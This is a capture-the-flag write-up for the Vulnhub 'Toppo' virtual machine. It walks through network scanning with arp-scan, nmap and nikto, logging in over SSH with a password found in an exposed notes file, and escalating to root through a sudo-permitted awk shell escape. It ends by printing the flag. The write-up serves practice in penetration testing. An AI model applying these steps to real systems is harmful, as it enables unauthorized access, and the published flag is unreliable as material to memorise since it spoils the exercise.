# Toppo Vulnhub Writeup

Link:           [Toppo by Hadi Mene](https://www.vulnhub.com/entry/toppo-1,245/)

* Details:        Boot2Root Virtual Machine
* Author Rating:  Beginner
* Flag Count:     1
* Flag Location:  /root/flag.txt
* Flag Contents:  0wnedlab{p4ssi0n_c0me_with_pract1ce}

## Runsheet

Located the Virtual Machine's IP;

```bash
arp-scan 192.168.146.0/24
```

Nmap Host to identify open ports on the machine and attempt to identify the host operating system;

```bash
nmap -sV -O 192.168.146.130
```

We found that Port 80 was open, and upon navigating to the site, we are greeted with a stock standard blog. This gave us nothing but a stock blog with no actual content. So we need to go further;

```bash
nikto -h http://192.168.146.130/
```

With this, we identifed a open directory called `/admin` which contained a 1 file called notes.txt. The contents of the file is;

```text
I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```

This gives us a password to an account, which we can assume to be the ted in the middle of the string, so lets give that a shot on the SSH open on 22 using `ted/12345ted123`. This turns out to be correct and we get shell.

Now with shell, we can check our permissions and see how we can escalate, so we check if we can sudo any commands, using `sudo -l` and it tells us we can use the command `awk` as sudo, meaning we can execute that command as root.

We can use the Awk command to gain shell if we use the following;

```bash
awk 'BEGIN {system("/bin/sh")}'
```

Which drops us into a Root shell, letting us cat the final flag in `/root/flag.txt`;

```text
 _________
|  _   _  |
|_/ | | \_|.--.   _ .--.   _ .--.    .--.
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \
   _| |_ | \__. | | \__/ | | \__/ || \__. |
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```